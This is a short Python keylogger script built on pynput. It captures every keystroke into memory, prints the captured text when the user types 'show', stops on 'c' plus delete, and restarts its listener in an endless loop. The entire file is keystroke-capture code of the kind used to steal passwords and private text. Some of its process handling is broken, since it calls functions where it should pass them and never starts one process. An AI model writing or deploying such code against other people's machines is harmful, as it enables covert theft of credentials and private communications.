from pynput import keyboard
import time
from multiprocessing import Process
from print_text import *
from time_stamp import add_time

input_keys = []
memory = {}

def on_press(key):
    try:
        input_keys.append(chr(ord(key.char)))
        # print(chr(ord(key.char)))
    except:
        input_keys.append(str(key))


###     stop monitoring or show memory     ###
def on_release(key):
    try:
        show = input_keys[-1] == 'w' and input_keys[-2] == 'o' and input_keys[-3] == 'h' and input_keys[-4] == 's'
        if show:
        ###     enter 'show' to view the last memory keys       ###
            for i in range(4):
                input_keys.pop()
            output_text = "".join(input_keys)
            print_text(output_text)
        ###     press "c + delete" to stop monitoring       ###
        elif key == keyboard.Key.delete and input_keys[-2] == 'c':
                return False
        else:
            pass
    except:
        pass

###     keyboard listener      ###
def run_listener():
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()


##     listen any time     ###
def run_listener_forever():
    while True:
        text = "".join(input_keys)
        l = Process(target=run_listener())
        m = Process(target=add_time(memory,text))
        l.start()
        l.join()
        l.terminate()









### run KeyLogger       ###
if __name__ == '__main__':

    run_listener_forever()
